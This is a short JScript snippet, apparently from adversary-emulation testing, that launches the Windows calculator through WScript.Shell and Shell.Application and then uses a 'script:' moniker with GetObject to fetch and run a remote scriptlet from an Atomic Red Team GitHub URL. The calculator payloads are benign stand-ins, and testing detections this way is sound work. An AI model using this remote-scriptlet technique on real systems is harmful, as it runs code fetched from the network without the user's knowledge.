
var ws = new ActiveXObject("WScript.shell");       
ws.Run("calc"); 

var shell = new ActiveXObject("Shell.Application");
shell.ShellExecute("calc","","", "open", "1");


GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct").Exec();